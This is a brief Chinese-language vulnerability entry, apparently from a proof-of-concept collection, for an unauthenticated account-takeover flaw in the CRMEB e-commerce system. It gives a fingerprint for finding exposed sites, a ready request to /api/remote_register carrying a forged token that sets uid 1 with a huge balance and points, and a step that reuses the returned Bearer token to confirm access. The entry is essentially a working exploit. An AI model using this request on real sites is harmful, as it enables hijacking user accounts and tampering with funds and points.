# CRMEBremote_register存在未授权任意用户接管漏洞

CRMEBremote ｜ 未授权访问 ｜ —
- **指纹**：`body="/wap/first/zsff/iconfont/iconfont.css"`
- **请求**：`GET /api/remote_register?remote_token=eyJ1aWQiOjEsInBob25lIjoiIiwibmlja25hbWUiOiJ0ZXN0IiwiYXZhdGFyIjoiIiwibm93X21vbmV5Ijo5OTk5OTkuOTksImludGVncmFsIjo5OTk5OTksImV4cCI6MH0 HTTP/1.1`

**Payload**
```
当uid存在时会修改积分信息并返回可用token
Host:
验证
GET /api/userinfo HTTP/1.1
Host:
Authori-zation: Bearer <token>
```
- **响应特征**：200